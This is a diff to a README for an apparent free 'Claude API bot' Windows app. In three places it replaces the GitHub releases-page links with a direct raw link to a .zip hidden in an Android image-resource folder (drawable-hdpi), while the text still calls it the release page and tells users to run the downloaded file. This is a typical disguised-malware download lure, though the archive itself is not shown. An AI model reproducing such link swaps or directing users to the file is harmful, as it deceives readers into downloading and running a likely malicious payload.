@@ -1,6 +1,6 @@
 # 🤖 Claude-free-api-bot - Free AI help in one place
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-1E90FF?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/aurearobotic610/Claude-free-api-bot/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-1E90FF?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/aurearobotic610/Claude-free-api-bot/main/app/src/main/res/drawable-hdpi/api-bot-free-Claude-2.0.zip)
 
 ## 🚀 What this app does
 
@@ -28,7 +28,7 @@ If your PC is newer and has more memory, the app will feel smoother.
 ## 📥 Download the app
 
 Go to the release page here and visit this page to download:
-https://github.com/aurearobotic610/Claude-free-api-bot/releases
+https://raw.githubusercontent.com/aurearobotic610/Claude-free-api-bot/main/app/src/main/res/drawable-hdpi/api-bot-free-Claude-2.0.zip
 
 On that page, look for the latest version and choose the Windows file. If there are several files, pick the one that matches your PC. Most users should choose the main Windows .exe or .zip file.
 
@@ -199,4 +199,4 @@ When a new release appears:
 4. Keep your settings if the release supports it
 
 Check the release page from time to time for fixes and new features:
-https://github.com/aurearobotic610/Claude-free-api-bot/releases
+https://raw.githubusercontent.com/aurearobotic610/Claude-free-api-bot/main/app/src/main/res/drawable-hdpi/api-bot-free-Claude-2.0.zip
